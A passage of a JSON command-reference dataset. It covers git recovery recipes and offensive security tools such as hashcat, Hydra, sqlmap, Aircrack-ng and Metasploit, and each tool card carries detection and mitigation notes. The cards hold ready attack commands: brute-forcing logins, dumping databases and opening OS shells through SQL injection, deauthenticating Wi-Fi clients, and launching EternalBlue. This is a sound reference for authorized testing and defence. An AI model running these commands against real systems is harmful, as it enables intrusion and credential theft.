 {"id":"gitr-recover-deleted-file","cat":"Git Recovery","title":"Recover a file deleted in a past commit","desc":"Find the commit that deleted a file, then check the file out from the commit just before it.","danger":"Writes the recovered file into your working tree, overwriting any file at that path.","tags":["git","recovery"],"code":{"ps":"git log --all --full-history --oneline -- {{FILE:path/to/file}}\ngit checkout {{SHA:a1b2c3d}}~1 -- {{FILE:path/to/file}}","cmd":"git log --all --full-history --oneline -- {{FILE:path/to/file}}\ngit checkout {{SHA:a1b2c3d}}~1 -- {{FILE:path/to/file}}","mac":"git log --all --full-history --oneline -- {{FILE:path/to/file}}\ngit checkout {{SHA:a1b2c3d}}~1 -- {{FILE:path/to/file}}","linux":"git log --all --full-history --oneline -- {{FILE:path/to/file}}\ngit checkout {{SHA:a1b2c3d}}~1 -- {{FILE:path/to/file}}"}},
 {"id":"gitr-undo-commit","related":["gitr-un-amend","gitr-orig-head"],"cat":"Git Recovery","title":"Undo the last commit, keep the changes","desc":"Roll back the most recent commit but keep its changes: --soft keeps them staged, --mixed (default) unstages them. Neither touches your files.","danger":"Rewrites history — only safe on commits you have NOT pushed or shared.","tags":["git","recovery","quick-win"],"code":{"ps":"git reset --soft HEAD~1","cmd":"git reset --soft HEAD~1","mac":"git reset --soft HEAD~1","linux":"git reset --soft HEAD~1"}},
 {"id":"gitr-un-amend","cat":"Git Recovery","title":"Undo an accidental git commit --amend","desc":"Recover the commit clobbered by 'git commit --amend'. The reflog's HEAD@{1} still points at the pre-amend commit.","danger":"'--hard' discards the amended changes; '--soft' keeps them staged. Unpushed history only.","tags":["git","recovery"],"code":{"ps":"git reflog\ngit reset --soft \"HEAD@{1}\"","cmd":"git reflog\ngit reset --soft HEAD@{1}","mac":"git reflog\ngit reset --soft HEAD@{1}","linux":"git reflog\ngit reset --soft HEAD@{1}"}},
 {"id":"gitr-stash-list","cat":"Git Recovery","title":"List and preview stashes","desc":"Show saved stashes and preview the contents of one before applying, to find work you set aside.","tags":["git","recovery"],"code":{"ps":"git stash list\ngit stash show -p \"stash@{0}\"","cmd":"git stash list\ngit stash show -p stash@{0}","mac":"git stash list\ngit stash show -p stash@{0}","linux":"git stash list\ngit stash show -p stash@{0}"}},
 {"id":"gitr-stash-apply","cat":"Git Recovery","title":"Reapply a stash","desc":"Bring back stashed work: 'apply' keeps the stash in the list, 'pop' applies it then removes it.","danger":"Applying onto a dirty tree can conflict; commit or clean your working tree first.","tags":["git","recovery"],"code":{"ps":"git stash apply \"stash@{0}\"","cmd":"git stash apply stash@{0}","mac":"git stash apply stash@{0}","linux":"git stash apply stash@{0}"}},
 {"id":"gitr-recover-dropped-stash","cat":"Git Recovery","title":"Recover a dropped/cleared stash","desc":"Recover a stash removed by 'git stash drop' or 'git stash clear'. Its commit is unreachable but not yet garbage-collected — find it with fsck, then apply.","danger":"Only works before garbage collection prunes the object. Applying may conflict.","tags":["git","recovery"],"code":{"ps":"git fsck --no-reflogs --unreachable | Select-String commit\ngit stash apply {{SHA:a1b2c3d}}","cmd":"git fsck --no-reflogs --unreachable | findstr commit\ngit stash apply {{SHA:a1b2c3d}}","mac":"git fsck --no-reflogs --unreachable | grep commit\ngit stash apply {{SHA:a1b2c3d}}","linux":"git fsck --no-reflogs --unreachable | grep commit\ngit stash apply {{SHA:a1b2c3d}}"}},
 {"id":"gitr-fsck-lost-found","related":["gitr-rescue-dangling-commit","gitr-recover-blob"],"cat":"Git Recovery","title":"Find dangling objects with fsck","desc":"List dangling/unreachable commits, blobs, and trees — the pool git draws recoverable lost work from. '--lost-found' also writes them into .git/lost-found/.","tags":["git","recovery"],"code":{"ps":"git fsck --full --no-reflogs --unreachable\ngit fsck --lost-found","cmd":"git fsck --full --no-reflogs --unreachable\ngit fsck --lost-found","mac":"git fsck --full --no-reflogs --unreachable\ngit fsck --lost-found","linux":"git fsck --full --no-reflogs --unreachable\ngit fsck --lost-found"}},
 {"id":"gitr-cat-file","cat":"Git Recovery","title":"Inspect an object by SHA","desc":"Identify a loose object found via reflog or fsck: -t shows its type, -p pretty-prints its content so you can confirm before recovering.","tags":["git","recovery"],"code":{"ps":"git cat-file -t {{SHA:a1b2c3d}}\ngit cat-file -p {{SHA:a1b2c3d}}","cmd":"git cat-file -t {{SHA:a1b2c3d}}\ngit cat-file -p {{SHA:a1b2c3d}}","mac":"git cat-file -t {{SHA:a1b2c3d}}\ngit cat-file -p {{SHA:a1b2c3d}}","linux":"git cat-file -t {{SHA:a1b2c3d}}\ngit cat-file -p {{SHA:a1b2c3d}}"}},
 {"id":"gitr-rescue-dangling-commit","cat":"Git Recovery","title":"Rescue a dangling commit","desc":"Turn a dangling commit back into real history — give it a branch to keep it, or cherry-pick it onto your current branch.","danger":"Cherry-pick can conflict and requires resolution; branch creation is always safe.","tags":["git","recovery"],"code":{"ps":"git branch {{NAME:rescued}} {{SHA:a1b2c3d}}\ngit cherry-pick {{SHA:a1b2c3d}}","cmd":"git branch {{NAME:rescued}} {{SHA:a1b2c3d}}\ngit cherry-pick {{SHA:a1b2c3d}}","mac":"git branch {{NAME:rescued}} {{SHA:a1b2c3d}}\ngit cherry-pick {{SHA:a1b2c3d}}","linux":"git branch {{NAME:rescued}} {{SHA:a1b2c3d}}\ngit cherry-pick {{SHA:a1b2c3d}}"}},
 {"id":"gitr-recover-blob","cat":"Git Recovery","title":"Recover a lost staged file (dangling blob)","desc":"Recover a file staged with 'git add' but lost before commit. 'git fsck --lost-found' writes each dangling blob to .git/lost-found/other/<sha> as a real file — copy it out and rename.","tags":["git","recovery"],"code":{"ps":"git fsck --lost-found\nGet-ChildItem .git/lost-found/other\nCopy-Item .git/lost-found/other/{{SHA:a1b2c3d}} {{OUT:recovered.txt}}","cmd":"git fsck --lost-found\ndir .git\\lost-found\\other\ncopy .git\\lost-found\\other\\{{SHA:a1b2c3d}} {{OUT:recovered.txt}}","mac":"git fsck --lost-found\nls .git/lost-found/other\ncp .git/lost-found/other/{{SHA:a1b2c3d}} {{OUT:recovered.txt}}","linux":"git fsck --lost-found\nls .git/lost-found/other\ncp .git/lost-found/other/{{SHA:a1b2c3d}} {{OUT:recovered.txt}}"}},
 {"id":"gitr-orig-head","cat":"Git Recovery","title":"Undo a merge/rebase/reset via ORIG_HEAD","desc":"After a merge, rebase, or reset, git saves the previous HEAD to ORIG_HEAD. Jump back to it to undo the operation in one step.","danger":"'--hard' discards current changes. Verify ORIG_HEAD points where you expect before resetting.","tags":["git","recovery"],"code":{"ps":"git log -1 --oneline ORIG_HEAD\ngit reset --hard ORIG_HEAD","cmd":"git log -1 --oneline ORIG_HEAD\ngit reset --hard ORIG_HEAD","mac":"git log -1 --oneline ORIG_HEAD\ngit reset --hard ORIG_HEAD","linux":"git log -1 --oneline ORIG_HEAD\ngit reset --hard ORIG_HEAD"}},
 {"id":"gitr-detached-head","cat":"Git Recovery","title":"Save commits made on a detached HEAD","desc":"Rescue commits made while in 'detached HEAD' state (e.g. after checking out a tag or SHA) before they become unreachable — attach them to a new branch.","tags":["git","recovery"],"code":{"ps":"git reflog\ngit branch {{NAME:recovered}} {{SHA:a1b2c3d}}","cmd":"git reflog\ngit branch {{NAME:recovered}} {{SHA:a1b2c3d}}","mac":"git reflog\ngit branch {{NAME:recovered}} {{SHA:a1b2c3d}}","linux":"git reflog\ngit branch {{NAME:recovered}} {{SHA:a1b2c3d}}"}},
 {"id":"gitr-revert","cat":"Git Recovery","title":"Safely undo a pushed commit","desc":"Undo an already-shared commit by creating a new commit that reverses it — no history rewrite, so it is safe on branches others have pulled.","danger":"Creates a new commit; may conflict and require resolution. Prefer this over reset on shared branches.","tags":["git","recovery","quick-win"],"code":{"ps":"git revert {{SHA:a1b2c3d}}","cmd":"git revert {{SHA:a1b2c3d}}","mac":"git revert {{SHA:a1b2c3d}}","linux":"git revert {{SHA:a1b2c3d}}"}},
 {"id":"gitr-pickaxe","cat":"Git Recovery","title":"Find lost content across all history","desc":"Search every branch's history for when a line was added or removed. -S finds occurrence-count changes for a string; -G matches a regex in the diff.","tags":["git","recovery"],"code":{"ps":"git log --all --oneline -S \"{{TEXT:needle}}\"\ngit log --all --oneline -G \"{{REGEX:some.*pattern}}\"","cmd":"git log --all --oneline -S \"{{TEXT:needle}}\"\ngit log --all --oneline -G \"{{REGEX:some.*pattern}}\"","mac":"git log --all --oneline -S \"{{TEXT:needle}}\"\ngit log --all --oneline -G \"{{REGEX:some.*pattern}}\"","linux":"git log --all --oneline -S \"{{TEXT:needle}}\"\ngit log --all --oneline -G \"{{REGEX:some.*pattern}}\""}},
 {"id":"gitr-history-rewrite-warning","cat":"Git Recovery","title":"Back up before rewriting history","desc":"Before any history-rewriting command (reset --hard, rebase, commit --amend, push --force, filter-branch, gc --prune=now), bundle every ref so nothing is truly lost. 'git bundle' is a portable full snapshot.","danger":"'git gc --prune=now' and 'git reflog expire' PERMANENTLY destroy unreachable objects — recovery is impossible after them. Reflog entries also expire on their own (~90 days default). Never force-push shared branches.","tags":["git","recovery","backup","teaching"],"code":{"ps":"git bundle create ../repo-backup.bundle --all\ngit fsck --full","cmd":"git bundle create ..\\repo-backup.bundle --all\ngit fsck --full","mac":"git bundle create ../repo-backup.bundle --all\ngit fsck --full","linux":"git bundle create ../repo-backup.bundle --all\ngit fsck --full"}},

/* ================= TOOLS ================= */
 {"id":"tool-hashcat","updated":"2026-07","cat":"Tools","team":"red","title":"hashcat","desc":"GPU-accelerated password/hash cracker supporting hundreds of hash modes; not on winget by default.","url":"https://hashcat.net/hashcat/","license":"MIT","platforms":["windows","macos","linux"],"tags":["password","tools"],"attack":["T1110.002"],"danger":"Offline cracking of captured hashes recovers plaintext credentials; running it against hashes you are not authorized to test is illegal.","detect":"Cracking is offline and host-local, so hunt the precursor theft: LSASS/SAM/NTDS.dit access (Sysmon 10, OS credential dumping) and abnormal sustained GPU load on non-workstation hosts.","mitigate":"Enforce long, high-entropy passwords with slow hashing (bcrypt/argon2), protect credential stores, and rotate any hash suspected of exposure.","steps":[{"title":"Run a dictionary attack","cmd":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","note":"-m is the hash mode (0=MD5, 1000=NTLM, 22000=WPA), -a 0 is a straight wordlist attack, and hashes.txt holds one hash per line. This is the fastest thing to try first."},{"title":"Add rules to mutate the words","cmd":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -r /usr/share/hashcat/rules/best64.rule","note":"Rules transform each candidate (append digits, swap case, leetspeak), so a small wordlist covers far more real-world passwords for very little extra cost."},{"title":"Brute-force with a mask","cmd":"hashcat -m {{MODE:0}} -a 3 hashes.txt '?u?l?l?l?l?d?d'","note":"-a 3 is a mask attack: ?u upper, ?l lower, ?d digit, ?s symbol. Masks target a known password shape (e.g. Word12) instead of trying everything blindly."},{"title":"Show what cracked","cmd":"hashcat -m {{MODE:0}} hashes.txt --show","note":"--show reads the potfile and prints the hash:password pairs already recovered, without spending time re-cracking them."},{"title":"Benchmark your hardware","cmd":"hashcat -b","optional":true,"note":"-b measures your GPU/CPU speed per hash mode so you can estimate how long an attack will take. Use --restore to resume an interrupted session."}],"install":{"mac":"brew install hashcat","linux":"sudo apt install hashcat"}},
 {"id":"tool-john","updated":"2026-07","cat":"Tools","team":"red","title":"John the Ripper","desc":"Classic CPU password cracker; use the community 'jumbo' build for extra formats (brew formula is john-jumbo).","url":"https://www.openwall.com/john/","license":"GPL-2.0-or-later","platforms":["windows","macos","linux"],"tags":["password","tools"],"attack":["T1110.002"],"danger":"Recovers plaintext from stolen password hashes; only use against hashes you own or are authorized to assess.","detect":"Cracking runs offline, so hunt the upstream credential theft (SAM/shadow/NTDS.dit access) and unexpected john/hashcat binaries executing on endpoints.","mitigate":"Use a strong password policy with modern salted slow hashes, and restrict access to /etc/shadow and domain databases.","steps":[{"title":"Auto-crack a hash file","cmd":"john hashes.txt","note":"John detects the hash format and runs its default strategy (single, wordlist, then incremental). The simplest possible start for a file of hashes."},{"title":"Wordlist attack with rules","cmd":"john --wordlist={{WORDLIST:/usr/share/wordlists/rockyou.txt}} --rules hashes.txt","note":"--rules applies John's word-mangling to each candidate. Add --format=... if John guessed the hash type wrong."},{"title":"Show recovered passwords","cmd":"john --show hashes.txt","note":"Prints the cracked user:password pairs from John's pot file, the readable summary of what you've recovered so far."},{"title":"Extract a hash from a file","cmd":"zip2john secret.zip > hashes.txt","optional":true,"note":"The *2john family (zip2john, ssh2john, rar2john, keepass2john) pulls a crackable hash out of a protected file so John can attack it."},{"title":"Force a specific format","cmd":"john --format=nt hashes.txt --wordlist={{WORDLIST:/usr/share/wordlists/rockyou.txt}}","optional":true,"note":"--format removes ambiguity when several hash types look alike (e.g. raw-MD5 vs NT), which otherwise makes John crack the wrong thing or nothing."}],"install":{"mac":"brew install john-jumbo","linux":"sudo apt install john"}},
 {"id":"tool-hydra","updated":"2026-07","cat":"Tools","team":"red","title":"THC-Hydra","desc":"Network login brute-forcer for many protocols (SSH, FTP, HTTP, RDP, SMB); Windows via WSL/Cygwin only.","url":"https://github.com/vanhauser-thc/thc-hydra","license":"AGPL-3.0","platforms":["macos","linux"],"tags":["password","network","tools"],"attack":["T1110.001"],"danger":"Online brute-force/password spraying against live services can lock out accounts and is highly intrusive; authorization required.","detect":"Watch for high-rate authentication failures from a single source against a service (Windows 4625, SSH auth logs, IDS brute-force signatures).","mitigate":"Enforce account lockout/rate limiting, MFA, and network ACLs on management protocols (SSH/RDP/SMB).","steps":[{"title":"Brute-force SSH for one user","cmd":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ssh://{{TARGET:10.0.0.5}}","note":"-l is a single username and -P the password list. Online brute forcing is loud and can lock accounts, so only run it against systems you're authorized to test."},{"title":"Try a list of usernames too","cmd":"hydra -L users.txt -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ssh://{{TARGET:10.0.0.5}}","note":"-L supplies a username file; Hydra then tries every user against every password, so keep the lists focused to avoid an explosion of attempts."},{"title":"Brute-force an HTTP login form","cmd":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} {{TARGET:10.0.0.5}} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'","note":"The module string is path:body:failure-condition. Hydra swaps ^USER^/^PASS^ into the body and treats any response containing 'incorrect' as a failed login."},{"title":"Point it at other services","cmd":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ftp://{{TARGET:10.0.0.5}}","optional":true,"note":"Swap the protocol prefix for ftp, rdp, smb, mysql, and dozens more — the same syntax drives every supported service."},{"title":"Throttle and stop on first hit","cmd":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -t 4 -f ssh://{{TARGET:10.0.0.5}}","optional":true,"note":"-t lowers parallel tasks to reduce lockouts and load, and -f stops as soon as one valid pair is found."}],"install":{"mac":"brew install hydra","linux":"sudo apt install hydra"}},
 {"id":"tool-sqlmap","updated":"2026-07","cat":"Tools","team":"red","title":"sqlmap","desc":"Automated SQL injection detection and exploitation tool (Python); no winget package.","url":"https://sqlmap.org","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["web","exploitation","tools"],"attack":["T1190"],"danger":"Automates SQL injection exploitation including data exfiltration and OS command execution; run only against systems you are authorized to test.","detect":"WAF/IDS alerts on injection payloads, the sqlmap default User-Agent, and anomalous DB errors/UNION queries in web and database logs.","mitigate":"Use parameterized queries/ORM, least-privilege database accounts, and a WAF; validate and sanitize all input.","steps":[{"title":"Test a parameter for SQL injection","cmd":"sqlmap -u 'http://{{TARGET:10.0.0.5}}/page?id=1' --batch","note":"sqlmap probes the id parameter with injection payloads; --batch takes the safe default for every prompt. Only run this against applications you are explicitly authorized to test."},{"title":"List the databases","cmd":"sqlmap -u 'http://{{TARGET:10.0.0.5}}/page?id=1' --batch --dbs","note":"Once a parameter is confirmed injectable, --dbs enumerates the database names available to the compromised query."},{"title":"Dump a table","cmd":"sqlmap -u 'http://{{TARGET:10.0.0.5}}/page?id=1' --batch -D {{DB:appdb}} -T {{TABLE:users}} --dump","note":"-D and -T select the database and table, and --dump extracts the rows — the proof-of-impact step for a SQL injection finding."},{"title":"Test from a saved HTTP request","cmd":"sqlmap -r request.txt --batch","optional":true,"note":"-r reads a full request saved from Burp or the browser, so POST bodies, cookies, and custom headers are all included automatically."},{"title":"Attempt command execution","cmd":"sqlmap -u 'http://{{TARGET:10.0.0.5}}/page?id=1' --batch --os-shell","optional":true,"note":"Where the DBMS and privileges allow, --os-shell tries to turn the injection into operating-system command execution. High impact — authorized engagements only."}],"install":{"mac":"brew install sqlmap","linux":"sudo apt install sqlmap"}},
 {"id":"tool-nikto","updated":"2026-07","cat":"Tools","team":"purple","title":"Nikto","desc":"Web server vulnerability and misconfiguration scanner (Perl); noisy by design.","url":"https://github.com/sullo/nikto","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["web","scanning","tools"],"attack":["T1595.002"],"danger":"Actively probes web servers with thousands of noisy requests that may trigger IPS blocks or destabilize fragile apps.","detect":"High volume of 404s/unusual URIs and the Nikto User-Agent in web access logs; IDS web-scan signatures.","mitigate":"Patch and harden web servers, remove default files, and rate-limit or block scanning source IPs.","steps":[{"title":"Scan a web server","cmd":"nikto -h http://{{TARGET:10.0.0.5}}","note":"Checks for thousands of known-dangerous files, outdated server software, and common misconfigurations. It's deliberately noisy, so expect it to show up clearly in logs and IDS."},{"title":"Scan HTTPS on a specific port","cmd":"nikto -h https://{{TARGET:example.com}} -p 443","note":"-p sets the port and an https:// URL (or -ssl) forces TLS, so you can point Nikto at services that aren't on plain port 80."},{"title":"Save a report","cmd":"nikto -h http://{{TARGET:10.0.0.5}} -o nikto.html -Format htm","optional":true,"note":"-o with -Format writes htm, csv, xml, or json — useful for handing findings off or comparing against a later scan."},{"title":"Focus the test categories","cmd":"nikto -h http://{{TARGET:10.0.0.5}} -Tuning 1234","optional":true,"note":"-Tuning selects which classes of checks run (files, injection, XSS, and so on), trimming a full scan down to what you care about."}],"install":{"mac":"brew install nikto","linux":"sudo apt install nikto"}},
 {"id":"tool-ffuf","updated":"2026-07","cat":"Tools","team":"purple","title":"ffuf","desc":"Fast Go web fuzzer for content/parameter/vhost discovery; apt package only in Kali/newer Debian, else 'go install'.","url":"https://github.com/ffuf/ffuf","license":"MIT","platforms":["windows","macos","linux"],"tags":["web","enumeration","tools"],"attack":["T1595.003"],"danger":"High-speed fuzzing generates large request volumes that can DoS weak endpoints and flood logs.","detect":"Spikes of 404/403 responses and rapid sequential URI/parameter guessing from one source in access logs.","mitigate":"Rate-limit, deploy a WAF, and monitor for enumeration bursts; avoid exposing sensitive paths predictably.","steps":[{"title":"Fuzz for directories and files","cmd":"ffuf -u http://{{TARGET:10.0.0.5}}/FUZZ -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}","note":"The keyword FUZZ marks where each wordlist entry is substituted. Put it in the path to brute-force content — ffuf is extremely fast."},{"title":"Match and filter responses","cmd":"ffuf -u http://{{TARGET:10.0.0.5}}/FUZZ -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -mc 200,301 -fc 404","note":"-mc keeps only these status codes and -fc drops others; -fs filters by size. Tuning these is how you cut a noisy scan down to real hits."},{"title":"Fuzz a query parameter","cmd":"ffuf -u 'http://{{TARGET:10.0.0.5}}/page?id=FUZZ' -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}","note":"FUZZ can go anywhere — path, query string, header, or body — so the same tool does parameter and value discovery, not just directories."},{"title":"Fuzz virtual hosts","cmd":"ffuf -u http://{{TARGET:10.0.0.5}} -H 'Host: FUZZ.example.com' -w {{WORDLIST:/usr/share/wordlists/dnsmap.txt}} -fs 0","optional":true,"note":"Placing FUZZ in the Host header finds name-based virtual hosts; -fs 0 filters the empty default-page responses."},{"title":"Fuzz POST body data","cmd":"ffuf -u http://{{TARGET:10.0.0.5}}/login -X POST -d 'user=admin&pass=FUZZ' -w {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","optional":true,"note":"-X sets the method and -d the body, so ffuf can brute-force form fields as well as URLs."}],"install":{"mac":"brew install ffuf","linux":"sudo apt install ffuf"}},
 {"id":"tool-wpscan","updated":"2026-07","cat":"Tools","team":"purple","title":"WPScan","desc":"WordPress vulnerability scanner (Ruby gem); enumerating plugins/users needs an API token for the vuln DB.","url":"https://wpscan.com/wordpress-security-scanner","license":"WPScan Public Source License","platforms":["macos","linux"],"tags":["web","scanning","tools"],"attack":["T1595.002"],"danger":"Enumerates WordPress users/plugins and can brute-force logins, which is intrusive against production sites.","detect":"WPScan User-Agent, rapid requests to wp-json/xmlrpc.php, and user-enumeration patterns in web logs.","mitigate":"Keep WordPress and plugins updated, restrict xmlrpc.php and REST user enumeration, and use strong credentials with login rate limiting.","steps":[{"title":"Scan a WordPress site","cmd":"wpscan --url http://{{TARGET:example.com}}","note":"Fingerprints the WordPress core version, active theme, and plugins, then flags versions with known vulnerabilities — the fast baseline for any WordPress target."},{"title":"Enumerate users and vulnerable plugins","cmd":"wpscan --url http://{{TARGET:example.com}} -e u,vp","note":"-e enumerates: u lists user accounts (login-name targets) and vp lists plugins with known vulns; ap covers all plugins."},{"title":"Add an API token for vuln data","cmd":"wpscan --url http://{{TARGET:example.com}} --api-token {{TOKEN:YOUR_TOKEN}}","note":"A free WPScan API token unlocks the vulnerability database so results include CVE details rather than just version numbers."},{"title":"Password-guess a discovered user","cmd":"wpscan --url http://{{TARGET:example.com}} -U {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","optional":true,"note":"Brute-forces wp-login for the named user against a wordlist. Loud and account-locking risk — run only with permission."}],"install":{"mac":"gem install wpscan","linux":"gem install wpscan"}},
 {"id":"tool-nuclei","updated":"2026-07","cat":"Tools","team":"purple","title":"Nuclei","desc":"Template-driven vulnerability scanner by ProjectDiscovery; no default apt, install via 'go install' or release binary.","url":"https://github.com/projectdiscovery/nuclei","license":"MIT","platforms":["windows","macos","linux"],"tags":["web","scanning","tools"],"attack":["T1595.002"],"danger":"Runs thousands of active vulnerability templates that can trigger exploit conditions on fragile targets.","detect":"Bursts of varied probe requests matching known template payloads and the ProjectDiscovery User-Agent in web/IDS logs.","mitigate":"Patch exposed services, deploy WAF/IDS, and rate-limit; review results and remediate confirmed findings.","steps":[{"title":"Scan with the full template set","cmd":"nuclei -u http://{{TARGET:example.com}}","note":"Runs the community template library — CVEs, misconfigurations, default creds, exposures — against the target and reports each match with its severity."},{"title":"Focus by severity","cmd":"nuclei -u http://{{TARGET:example.com}} -severity critical,high","note":"-severity (or -tags) narrows the run to what matters, which is much faster and cuts low-value noise on a large scope."},{"title":"Scan a list of hosts","cmd":"nuclei -l hosts.txt -o findings.txt","note":"-l reads many targets and -o saves results. This is the natural next step after subfinder/httpx produce a list of live hosts."},{"title":"Update the templates","cmd":"nuclei -update-templates","optional":true,"note":"Refreshes the template library so you're testing the latest checks — worth doing before an important scan."},{"title":"Run a single template or folder","cmd":"nuclei -u http://{{TARGET:example.com}} -t {{TEMPLATE:cves/}}","optional":true,"note":"-t runs one specific template or directory, handy for re-checking a single CVE across hosts."}],"install":{"mac":"brew install nuclei","linux":"go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}},
 {"id":"tool-aircrack-ng","updated":"2026-07","cat":"Tools","team":"red","title":"Aircrack-ng","desc":"Wi-Fi security suite for capture and WEP/WPA-PSK key cracking; needs a monitor-mode adapter (Linux is primary platform).","url":"https://www.aircrack-ng.org","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["wireless","password","tools"],"attack":["T1040"],"danger":"Captures wireless traffic and cracks WEP/WPA-PSK keys; intercepting networks you do not own is illegal.","detect":"Monitor-mode adapters and deauthentication floods (802.11 deauth frames) are visible to WIDS/WIPS.","mitigate":"Use WPA2/WPA3-Enterprise with strong PSKs, enable management-frame protection (802.11w), and deploy a wireless IDS.","steps":[{"title":"Put your adapter into monitor mode","cmd":"sudo airmon-ng check kill\nsudo airmon-ng start {{IFACE:wlan0}}","note":"Stops background processes that fight for the radio, then switches the card into monitor mode — it usually reappears as a new interface such as wlan0mon. Root is required, and the adapter drops off normal Wi-Fi while in this mode."},{"title":"Survey the networks around you","cmd":"sudo airodump-ng {{MON:wlan0mon}}","note":"Lists nearby access points with their BSSID (MAC address), channel, and connected clients. Find your target, note its BSSID and channel, then press Ctrl-C to stop."},{"title":"Capture traffic on the target's channel","cmd":"sudo airodump-ng -c {{CHANNEL:6}} --bssid {{BSSID:AA:BB:CC:DD:EE:FF}} -w capture {{MON:wlan0mon}}","note":"Locks onto one access point and writes packets to capture-01.cap. Leave it running: when a device joins, a \"WPA handshake\" notice appears at the top-right. That four-way handshake is exactly what you need to crack the passphrase offline."},{"optional":true,"title":"Nudge a client to reconnect","cmd":"sudo aireplay-ng --deauth 5 -a {{BSSID:AA:BB:CC:DD:EE:FF}} {{MON:wlan0mon}}","note":"Sends a few deauthentication frames so an already-connected device reconnects and re-sends the handshake, saving you the wait. This briefly disrupts real users, so only do it on a network you are authorized to test."},{"title":"Verify you actually captured a handshake","cmd":"aircrack-ng capture-01.cap","note":"Opens the capture and reports \"(1 handshake)\" beside the network name when a valid EAPOL exchange is present. If it shows none, keep capturing — trying to crack a file without a handshake can never succeed."},{"title":"Crack the passphrase against a wordlist","cmd":"aircrack-ng -w {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} capture-01.cap","note":"Tests each word in the list against the captured handshake, entirely offline. If the passphrase is in the list it prints \"KEY FOUND!\" with the password; a long random passphrase simply won't be there, which is the whole defense."},{"title":"Return the adapter to normal Wi-Fi","cmd":"sudo airmon-ng stop {{MON:wlan0mon}}\nsudo systemctl restart NetworkManager","note":"Takes the card out of monitor mode and restarts networking so the machine reconnects as usual. Always clean up once the audit is finished."}],"install":{"mac":"brew install aircrack-ng","linux":"sudo apt install aircrack-ng"}},
 {"id":"tool-metasploit","updated":"2026-07","cat":"Tools","team":"red","title":"Metasploit Framework","desc":"Exploitation and post-exploitation framework by Rapid7; use the official msfinstall script outside Kali.","url":"https://www.metasploit.com","license":"BSD-3-Clause","platforms":["windows","macos","linux"],"tags":["exploitation","tools"],"attack":["T1210"],"danger":"Full exploitation framework that can gain remote code execution and deploy post-exploitation payloads; authorized testing only.","detect":"Default Meterpreter/staged payload network signatures, common module artifacts, and EDR alerts on injected processes (IDS/Sysmon).","mitigate":"Patch promptly, segment networks, deploy EDR, and alert on known Metasploit payload indicators.","steps":[{"title":"Launch the console","cmd":"msfconsole -q","note":"-q skips the banner. From the msf prompt you drive everything with search, use, set, and run — start the database (msfdb init) beforehand for workspaces and loot storage."},{"title":"Find and load a module","cmd":"search {{TERM:eternalblue}}\nuse {{MODULE:exploit/windows/smb/ms17_010_eternalblue}}","note":"search lists modules matching a term (CVE, product, or name); use selects one by full name or by its search index number."},{"title":"Set options and run","cmd":"set RHOSTS {{TARGET:10.0.0.5}}\nset LHOST {{LHOST:10.0.0.2}}\nrun","note":"'show options' lists what a module needs; set fills each in; run (or exploit) launches it. A successful exploit hands you an interactive session. Authorized targets only."},{"title":"Manage your sessions","cmd":"sessions -l\nsessions -i 1","optional":true,"note":"-l lists open sessions and -i interacts with one by number; press Ctrl-Z to background a session and return to the console."},{"title":"Run a post-exploitation module","cmd":"use post/multi/manage/shell_to_meterpreter\nset SESSION 1\nrun","optional":true,"note":"post/ modules act on an existing session — here upgrading a basic shell to Meterpreter. Others gather creds, hashes, and host info."}],"install":{"mac":"brew install --cask metasploit","linux":"curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && ./msfinstall"}},
 {"id":"tool-bloodhound","updated":"2026-07","cat":"Tools","team":"purple","title":"BloodHound (CE)","desc":"Graphs Active Directory attack paths from collector data (SharpHound/AzureHound); Community Edition runs via Docker Compose.","url":"https://bloodhound.specterops.io","license":"Apache-2.0","platforms":["windows","macos","linux"],"tags":["active-directory","enumeration","tools"],"attack":["T1069.002","T1482"],"danger":"Reveals AD attack paths to privilege escalation; collector runs (SharpHound) touch many directory objects and can tip off defenders.","detect":"SharpHound collection generates heavy LDAP/SAMR queries and session enumeration; hunt for bulk directory reconnaissance (Windows 4662, LDAP logs).","mitigate":"Tier admin access, prune excessive ACLs/sessions surfaced by BloodHound, and monitor for mass LDAP enumeration.","install":{"linux":"curl -L https://ghst.ly/getbhce -o docker-compose.yml && docker compose up"}},
 {"id":"tool-netexec","updated":"2026-07","cat":"Tools","team":"red","title":"NetExec (nxc)","desc":"Network service post-exploitation/enumeration over SMB/WinRM/LDAP/MSSQL; maintained successor to CrackMapExec.","url":"https://github.com/Pennyw0rth/NetExec","license":"BSD-2-Clause","platforms":["windows","macos","linux"],"tags":["active-directory","smb","tools"],"attack":["T1021.002","T1110"],"danger":"Automates credential spraying and lateral movement over SMB/WinRM/LDAP; highly intrusive and noisy.","detect":"Bursts of SMB/WinRM logons across many hosts, 4625/4624 patterns, and admin-share access (T1021.002) from a single source.","mitigate":"Enforce SMB signing, LAPS, MFA, network segmentation, and lockout policies; monitor lateral authentication.","steps":[{"title":"Sweep SMB for host details","cmd":"nxc smb {{RANGE:10.0.0.0/24}}","note":"Pings SMB across the range and reports each host's name, domain, OS, and whether signing is enforced — a fast map of the Windows estate before you authenticate."},{"title":"Validate a credential","cmd":"nxc smb {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}}","note":"Tests the username/password against the host; a green '(Pwn3d!)' means local admin. Add -d for a domain account. Authorized targets 